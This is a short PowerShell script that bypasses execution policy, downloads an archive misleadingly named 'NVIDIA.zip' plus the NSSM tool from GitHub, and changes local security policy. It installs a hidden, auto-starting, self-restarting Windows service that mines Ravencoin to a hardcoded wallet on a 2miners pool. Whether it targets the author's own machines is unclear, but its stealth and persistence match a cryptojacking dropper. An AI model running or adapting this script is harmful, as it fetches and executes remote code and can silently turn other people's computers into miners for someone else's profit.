Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force
$rigelFolder = "C:\rigel"
$serviceName = "rigel"
New-Item -ItemType Directory -Force -Path $rigelFolder | Out-Null
$zipUrl = "https://github.com/GALVINVN/GPU/releases/download/session/NVIDIA.zip"
$zipPath = "$env:TEMP\NVIDIA.zip"
Invoke-WebRequest -Uri $zipUrl -OutFile $zipPath -UseBasicParsing
Expand-Archive -Path $zipPath -DestinationPath $rigelFolder -Force
$rvnpool = Get-ChildItem -Path $rigelFolder -Recurse -Filter "rvn-pool.bat" | Select-Object -First 1 -ExpandProperty FullName
Invoke-WebRequest -Uri https://github.com/GALVINVN/system/raw/refs/heads/main/nssm-2.24.zip -OutFile C:\nssm-2.24.zip
$nssmZipPath = "C:\nssm-2.24.zip"
Expand-Archive -Path $nssmZipPath -DestinationPath $rigelFolder -Force
$nssmExe = "$rigelFolder\nssm-2.24\win64\nssm.exe"
$wallet = "RX2bYm1j6XVoChhFkvVUpahZCRebVfCuz4"
$worker = "x1"
$algorithm = "kawpow"
$coin = "rvn"
$pool = "stratum+tcp://rvn.2miners.com:6060"
$appParams = "-a $algorithm " +
             "--coin $coin " +
             "-o $pool " +
             "-u $wallet " +
             "-w $worker"
secedit /export /cfg "$env:TEMP\secpol.cfg" | Out-Null
(Get-Content "$env:TEMP\secpol.cfg") -replace 'SeLockMemoryPrivilege =.*', 'SeLockMemoryPrivilege = *S-1-5-18' | Set-Content "$env:TEMP\secpol_new.cfg"
secedit /configure /db secedit.sdb /cfg "$env:TEMP\secpol_new.cfg" /areas USER_RIGHTS | Out-Null
if (Get-Service -Name $serviceName -ErrorAction SilentlyContinue) {
    & $nssmExe stop $serviceName 2>$null
    & $nssmExe remove $serviceName confirm 2>$null
}
& $nssmExe install $serviceName $rvnpool
& $nssmExe set $serviceName AppParameters $appParams
& $nssmExe set $serviceName AppDirectory $rigelFolder
& $nssmExe set $serviceName AppNoConsole 1
& $nssmExe set $serviceName Start SERVICE_AUTO_START
& $nssmExe set $serviceName AppExit Default Restart
& $nssmExe start $serviceName
